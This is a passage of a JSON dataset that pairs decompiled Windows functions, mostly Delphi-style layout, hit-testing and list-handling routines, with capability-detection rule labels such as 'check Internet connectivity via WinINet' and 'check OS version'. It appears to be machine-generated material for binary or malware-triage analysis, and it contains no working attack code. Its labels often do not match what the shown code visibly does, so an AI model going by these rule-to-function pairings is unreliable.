            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445f54(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00446020();\n        }\n        else {\n            fcn.0040c8dc();\n            fcn.00403fc0();\n        }\n        return;\n    }\n    fcn.00446020();\n    return;\n}\n",
        "token_count": 149
    },
    "00445f9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00445f9c(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.004463f0();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x8c))();\n    if (param_2 == '\\x01') {\n        return uStack28;\n    }\n    if (param_2 == '\\x02') {\n        return uStack32;\n    }\n    return 0;\n}\n",
        "token_count": 270
    },
    "00446020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00446020(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.00445eb4(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x8c))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack20 - iStack28;\n        }\n        else {\n            iVar2 = iStack24 - iStack32;\n        }\n    }\n    else {\n        for (; iVar2 != *(*(in_EAX + 0x1c) + 100); iVar2 = *(iVar2 + 0x14)) {\n            if (param_2 == *(*(iVar2 + 0x14) + 0x10)) {\n                iVar2 = fcn.004463f0();\n                iVar1 = fcn.00445f0c();\n                return iVar2 - iVar1;\n            }\n        }\n        if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n            iVar2 = *(*(in_EAX + 0x1c) + 0x68);\n        }\n        else {\n            iVar2 = fcn.004463f0();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 452
    },
    "004460d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004460d8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00445eb4();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.004464f4();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.00446020();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.00446020();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.00445eb4();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.00446418();\n            }\n            else {\n                fcn.00445f0c();\n                fcn.00446418();\n            }\n            fcn.00446278();\n            iVar1 = fcn.004464cc();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 284
    },
    "00446180": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446180(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004045c8();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040c998();\n            fcn.00403fc0();\n        }\n        fcn.0040461c();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "004461c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x004461f9)\n\nuint32_t fcn.004461c4(void)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00403a28();\n    return uVar1 & 0xffffff00;\n}\n",
        "token_count": 99
    },
    "00446278": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446278(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x9c) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.00446020();\n    iVar2 = fcn.00446020();\n    cVar1 = fcn.00446248(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.004464cc();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.004463f0(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x0044639e;\n        iVar3 = fcn.004463f0();\n        iVar4 = fcn.004463f0();\n        if (iVar4 <= iVar3) goto code_r0x0044639e;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x0044639e:\n    arg_8h = &var_14h;\n    uVar5 = fcn.00445f9c();\n    fcn.00445f9c(uVar5);\n    fcn.0041b0a8(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.0043d208();\n    return;\n}\n",
        "token_count": 675
    },
    "00446500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446500(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x446515;\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x446528;\n    fcn.004037f0();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x40000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x446578;\n    iVar2 = fcn.00445e7c();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x44658a;\n    iVar2 = fcn.0042675c();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x44659e;\n    fcn.0042d4fc();\n    puStack48 = 0x4465a7;\n    fcn.004268d8();\n    puStack48 = 0x4465af;\n    fcn.004466d0();\n    uStack52 = 0x44660c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.00440d74();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00440d38(0);\n            (**(*in_EAX + 8))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004460d8();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x446613;\n    uStack52 = 0x44660b;\n    fcn.004466d4();\n    return;\n}\n",
        "token_count": 595
    },
    "004466e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004466e8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.004466e8(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.004466e8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00446740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00446740(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.004466e8(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 92
    },
    "00446844": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00446844(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x8c))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.0043d7ec();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.0043d7d8();\n                    }\n                }\n                fcn.0041b0a8(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.0043d208();\n                iVar1 = fcn.00445e7c();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.00446740();\n                if (iVar2 != 0) {\n                    fcn.00447790();\n                }\n                var_8h = fcn.00446740();\n                var_9h = *(var_1h + 0x483cd4);\n                iVar2 = fcn.00445ea0();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.00446020();\n                        fcn.00446418();\n                        uVar3 = fcn.00446020();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.00446020();\n                        fcn.00446418();\n                        uVar3 = fcn.00446020();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.00445e7c();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = in_EAX[0x19] & 0xffffff00 | *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(var_8h + 0x14) & 0xffffff00 | *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.00446bfc(*(var_1h + 0x483cdc));\n                }\n                else {\n                    fcn.00446a54(*(var_1h + 0x483cdc), uVar4 & 0xffffff00 | var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.00446278();\n        }\n        (**(*in_EAX[5] + 0x7c))();\n    }\n    return;\n}\n",
        "token_count": 1071
    },
    "00446a54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446a54(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.00445e7c();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.00446418();\n        uVar3 = fcn.004463f0();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.004467a8(0x447ae8);\n            uVar4 = fcn.004463f0();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.004467a8(0x447e6c);\n            fcn.004463f0();\n            fcn.00446418();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.004467a8(0x447ae8);\n        }\n        fcn.004467a8(0x447fa0);\n    }\n    else {\n        fcn.004463f0();\n        fcn.00446418();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        *(iVar2 + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = iVar2;\n        }\n        if (in_ECX == *(*(iVar2 + 0x14) + 8)) {\n            *(*(iVar2 + 0x14) + 8) = iVar2;\n        }\n        *(in_EDX + 0x14) = iVar2;\n        *(in_ECX + 0x14) = iVar2;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            *(in_ECX + 0x18) = in_EDX;\n            *(in_ECX + 0xc) = 0;\n            *(in_EDX + 0xc) = in_ECX;\n        }\n        else {\n            *(iVar2 + 8) = in_ECX;\n            *(in_ECX + 0x18) = 0;\n            *(in_ECX + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = in_ECX;\n        }\n    }\n    fcn.004460d8();\n    fcn.0044646c();\n    fcn.004467a8(0x447fa0);\n    return;\n}\n",
        "token_count": 967
    },
    "00446c74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446c74(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x01') {\n        iVar1 = fcn.004463f0();\n        if (*(*(arg_8h + -4) + 4) <= iVar1) {\n            iVar1 = fcn.004463f0();\n            if (iVar1 - *(*(arg_8h + -8) + 0xc) <= *(*(arg_8h + -4) + 4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x00446e51;\n            }\n        }\n    }\n    if (*(*(in_EAX + 0x14) + 0x10) == '\\x02') {\n        iVar1 = fcn.004463f0();\n        if (**(arg_8h + -4) <= iVar1) {\n            iVar1 = fcn.004463f0();\n            if (iVar1 - *(*(arg_8h + -8) + 0xc) <= **(arg_8h + -4)) {\n                **(arg_8h + -0xc) = 0x12;\n                *(arg_8h + -0x10) = in_EAX;\n                goto code_r0x00446e51;\n            }\n        }\n    }\n    if (*(in_EAX + 4) != 0) {\n        iVar1 = fcn.00445f9c();\n        iVar2 = fcn.00445f9c();\n        if (*(*(arg_8h + -8) + 0x1c) == '\\0') {\n            if (((iVar2 <= **(arg_8h + -4)) && (**(arg_8h + -4) <= iVar2 + *(*(arg_8h + -8) + 0x18))) &&\n               (iVar1 <= *(*(arg_8h + -4) + 4))) {\n                iVar2 = fcn.00446020();\n                if (*(*(arg_8h + -4) + 4) <= iVar1 + iVar2) {\n                    *(arg_8h + -0x10) = in_EAX;\n                    if (*(*(arg_8h + -4) + 4) < *(*(in_EAX + 4) + 0x44) + 0xf) {\n                        **(arg_8h + -0xc) = 0x14;\n                    }\n                    else {\n                        **(arg_8h + -0xc) = 2;\n                    }\n                }\n            }\n        }\n        else if (((iVar1 <= *(*(arg_8h + -4) + 4)) && (*(*(arg_8h + -4) + 4) <= iVar1 + *(*(arg_8h + -8) + 0x18))) &&\n                (iVar2 <= **(arg_8h + -4))) {\n            iVar1 = fcn.00446020();\n            if (**(arg_8h + -4) <= iVar2 + iVar1) {\n                *(arg_8h + -0x10) = in_EAX;\n                if (*(*(in_EAX + 4) + 0x40) + *(*(in_EAX + 4) + 0x48) + -0xf < **(arg_8h + -4)) {\n                    **(arg_8h + -0xc) = 0x14;\n                }\n                else {\n                    **(arg_8h + -0xc) = 2;\n                }\n            }\n        }\n    }\ncode_r0x00446e51:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar1 = fcn.004464cc();\n        if (iVar1 != 0) {\n            iVar1 = arg_8h;\n            fcn.004464cc();\n            fcn.00446c74(iVar1);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar1 = fcn.004464f4();\n        if (iVar1 != 0) {\n            fcn.004464f4();\n            fcn.00446c74(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 991
    },
    "00446ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00446ea0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint lprc;\n    uint pt;\n    uint var_4h;\n    \n    iVar2 = fcn.00440d74();\n    iVar2 = iVar2 + -1;\n    if (-1 < iVar2) {\n        do {\n            piVar3 = fcn.00440d38();\n            if ((*(piVar3 + 0x57) != '\\0') && ((cVar1 = fcn.004039b8(),  cVar1 == '\\0' || (*(piVar3 + 0x1a6) != '\\0'))))\n            {\n                fcn.0041b058();\n                (**(*piVar3 + 0x44))(pt, var_4h);\n                iVar4 = sub.user32.dll_PtInRect(&lprc);\n                if (iVar4 != 0) {\n                    return piVar3;\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return NULL;\n}\n",
        "token_count": 266
    },
    "00446f34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00446f34(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.00446ea0(&stack0xfffffffc);\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0xa0))) {\n        iVar2 = fcn.004464f4();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.004464f4();\n            fcn.00446c74(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.00446740();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 262
    },
    "00446fbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446fbc(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.004045c8();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.00404c14();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00447004": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044708a)\n// WARNING: Removing unreachable block (ram,0x004470a5)\n// WARNING: Removing unreachable block (ram,0x00447144)\n// WARNING: Removing unreachable block (ram,0x00447152)\n\nvoid __fastcall fcn.00447004(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x447222;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    fcn.004476f8();\n    fcn.004466d0();\n    uVar2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    (**(*param_2 + 0xc))();\n    (**(*param_2 + 0xc))();\n    if (-1 < var_20h + -1) {\n        do {\n            fcn.00446fbc(&stack0xfffffffc);\n            var_20h = var_20h + -1;\n        } while (var_20h != 0);\n    }\n    (**(*param_2 + 0xc))();\n    var_18h = 0;\n    var_24h = 0;\n    while ((**(*param_2 + 0xc))(),  var_14h != *0x483ce4) {\n        iVar1 = fcn.00445e7c();\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0xc))();\n        fcn.00446fbc(&stack0xfffffffc);\n        if (var_14h == 0) {\n            *(in_EAX + 100) = iVar1;\n        }\n        else if (var_14h == var_18h) {\n            *(var_24h + 0xc) = iVar1;\n            *(iVar1 + 0x18) = var_24h;\n            *(iVar1 + 0x14) = *(var_24h + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(var_24h + 8) = iVar1;\n            *(iVar1 + 0x14) = var_24h;\n        }\n        else if (var_14h < var_18h) {\n            var_28h = var_24h;\n            var_18h = var_18h - var_14h;\n            if (0 < var_18h) {\n                do {\n                    var_28h = *(var_28h + 0x14);\n                    var_18h = var_18h + -1;\n                } while (var_18h != 0);\n            }\n            *(var_28h + 0xc) = iVar1;\n            *(iVar1 + 0x18) = var_28h;\n            *(iVar1 + 0x14) = *(var_28h + 0x14);\n        }\n        var_18h = var_14h;\n        var_24h = iVar1;\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.004466d4();\n    return;\n}\n",
        "token_count": 833
    },
    "004473ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004473ec(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x447405;\n    var_4h = fcn.00426a54();\n    uStack52 = 0x447542;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x447421;\n    puStack48 = &stack0xfffffffc;\n    fcn.0043c424();\n    puStack60 = 0x447429;\n    fcn.00426d58();\n    uStack64 = 0x447525;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x447441;\n    puStack60 = &stack0xfffffffc;\n    fcn.004270cc();\n    uStack76 = 0x447508;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.00440d74();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.00440d38();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0xa0) == in_EAX[5])) {\n                fcn.0043d1e8();\n                (***in_EAX)();\n                var_1ch = *(iVar1 + 0x40) * 2 - var_1ch;\n                var_18h = *(iVar1 + 0x44) * 2 - var_18h;\n                var_14h = *(iVar1 + 0x48) * -2 + var_14h * 3 + var_1ch * -2;\n                var_10h = *(iVar1 + 0x4c) * -2 + var_10h * 3 + var_18h * -2;\n                (**(*in_EAX + 0x10))(&fcn.004473ec::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x44750f;\n    uStack76 = 0x447507;\n    fcn.004270cc();\n    return;\n}\n",
